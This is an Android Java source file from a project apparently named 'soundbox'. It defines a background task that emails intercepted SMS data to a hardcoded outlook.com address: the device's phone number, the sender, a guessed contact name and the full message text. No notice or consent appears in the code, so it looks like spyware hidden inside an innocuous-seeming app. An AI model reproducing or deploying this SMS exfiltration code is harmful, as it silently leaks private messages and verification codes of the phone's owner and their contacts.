package com.example.manux.soundbox.async;

import android.icu.text.DateFormat;
import android.icu.text.SimpleDateFormat;
import android.os.AsyncTask;
import android.util.Log;

import com.example.manux.soundbox.managers.MailerManager;

import java.util.Date;

/**
 * Created by norbert on 15/02/2017.
 */

public class MailSendAsync  extends AsyncTask<Void, Void, Void>{

    String strMessageFrom;
    String strMessageBody;
    String mPhoneNumber;
    String strGuessNameFrom;

    public MailSendAsync(String mPhoneNumber, String strMessageFrom, String strGuessNameFrom , String strMessageBody)
    {
        this.strMessageFrom = strMessageFrom;
        this.strMessageBody = strMessageBody;
        this.mPhoneNumber = mPhoneNumber;
        this.strGuessNameFrom = strGuessNameFrom;
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {

            DateFormat dateFormat = new SimpleDateFormat("dd/MM/yy HH:mm:ss");
            Date date = new Date();

            MailerManager mailler = new MailerManager();
            mailler._to = new String[]{"bc123soundox@outlook.com"};
            mailler._subject = strMessageFrom + "-" + dateFormat.format(date);
            mailler.setBody(
                    (mPhoneNumber )  + " received SMS from: " + strMessageFrom + "(" +  strGuessNameFrom + ")"  + "\n"
                            + "------------------- CONTENT -----------------------"
                            + "\n\n" + strMessageBody);
            mailler.send();
        } catch (Exception e) {
            Log.e("MailApp", "Could not send email", e);
        }
        return  null;
    }
}
